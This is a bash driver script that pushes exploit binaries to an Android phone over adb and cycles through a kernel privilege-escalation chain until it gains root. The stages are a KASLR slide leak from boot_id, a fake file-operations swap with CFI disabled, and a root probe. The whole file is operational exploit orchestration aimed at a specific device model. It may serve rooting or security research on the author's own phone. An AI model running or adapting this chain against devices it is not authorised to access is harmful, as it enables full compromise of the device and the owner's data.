#!/bin/bash
# rw_drive.sh — full R/W root cycle driver (host, Git Bash).
# See docs/ROOT_PLAN_2026-08-28.md. Usage: ./rw_drive.sh [max_cycles]
ADB="/c/Users/LENOVO/AppData/Local/Microsoft/WinGet/Packages/Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe/platform-tools/adb.exe"
SER=192.168.1.108:5555
ROOT="$(cd "$(dirname "$0")" && pwd)"
MAX=${1:-8}

adb() { MSYS_NO_PATHCONV=1 "$ADB" -s "$SER" "$@"; }

"$ADB" connect $SER >/dev/null 2>&1
adb shell "mkdir -p /data/local/tmp" >/dev/null 2>&1
adb push "$ROOT/ghostlock-cph2521" /data/local/tmp/gl_rw >/dev/null 2>&1
adb push "$ROOT/swap_probe" /data/local/tmp/swap_probe >/dev/null 2>&1
adb shell "chmod 755 /data/local/tmp/gl_rw /data/local/tmp/swap_probe" >/dev/null 2>&1

make_runner() {  # $1=file $2=env-assignments...
  local f=$1; shift
  printf '#!/system/bin/sh\n' > "$f"
  printf 'export MODE4_ONLY=1\n' >> "$f"
  for e in "$@"; do printf 'export %s\n' "$e" >> "$f"; done
  printf 'cd /data/local/tmp\n/data/local/tmp/gl_rw > /data/local/tmp/gl_out.txt 2>&1\necho EXIT=$?\n' >> "$f"
}

for cycle in $(seq 1 $MAX); do
  echo "=== CYCLE $cycle =========================================="
  # uptime before (continuity check data)
  UP0=$(adb shell "cut -d. -f1 /proc/uptime" | tr -d '\r')

  # ---- O-fire: oracle ----
  make_runner /tmp/gl_o.sh "MODE4_SLIDE=1"
  adb push /tmp/gl_o.sh /data/local/tmp/gl_run.sh >/dev/null 2>&1
  adb shell "tr -d '\\r' < /data/local/tmp/gl_run.sh > /data/local/tmp/glr.sh; chmod 755 /data/local/tmp/glr.sh; /data/local/tmp/glr.sh" | tr -d '\r' | tail -1
  BID=$(adb shell "cat /proc/sys/kernel/random/boot_id" | tr -d '\r')
  UP1=$(adb shell "cut -d. -f1 /proc/uptime" | tr -d '\r')
  echo "boot_id=$BID uptime=$UP0->$UP1"
  SLIDE=$(python "$ROOT/tools/slide_decode.py" "$BID" | awk '{print $3}')
  echo "slide=$SLIDE"
  if [ "$SLIDE" = "None" ] || [ -z "$SLIDE" ]; then
    echo "oracle miss (walk); waiting for stable boot and re-rolling"
    sleep 90; continue
  fi

  # ---- N-fire: swap, no open ----
  make_runner /tmp/gl_n.sh "MODE4_SLIDE_SWAP=1" "KASLR_SLIDE=$SLIDE" "MODE4_SWAP_NOCFI=1"
  adb push /tmp/gl_n.sh /data/local/tmp/gl_run.sh >/dev/null 2>&1
  adb shell "tr -d '\\r' < /data/local/tmp/gl_run.sh > /data/local/tmp/glr.sh; chmod 755 /data/local/tmp/glr.sh; /data/local/tmp/glr.sh" | tr -d '\r' | tail -1
  UP2=$(adb shell "cut -d. -f1 /proc/uptime" | tr -d '\r')
  echo "post-swap uptime=$UP2 (rebooted if < $UP1)"
  FF=$(adb shell "grep -o 'fake_fops (ffffff[0-9a-f]*)' /data/local/tmp/gl_out.txt | tail -1 | grep -o 'ffffff[0-9a-f]*'" | tr -d '\r')
  echo "fake_fops=$FF"
  if [ -z "$FF" ]; then
    echo "swap walk miss; re-roll"
    sleep 90; continue
  fi
  if [ "$UP2" -lt "$UP1" ]; then
    echo "device softbooted during swap walk; re-roll"
    sleep 90; continue
  fi

  # ---- WINDOW OPEN: run probe NOW ----
  echo "--- WINDOW OPEN: swap_probe $FF $SLIDE ---"
  adb shell "/data/local/tmp/swap_probe $FF $SLIDE 2>&1" | tr -d '\r'
  RC=$?
  echo "probe rc=$RC"
  adb shell "cat /data/local/tmp/ROOTED 2>/dev/null" | tr -d '\r'
  adb shell "id; cat /proc/uptime" | tr -d '\r'
  if [ $RC -eq 0 ]; then echo "*** ROOT ACHIEVED cycle $cycle ***"; exit 0; fi
  echo "window failed; re-roll"
  sleep 90
done
echo "no root after $MAX cycles"
exit 1
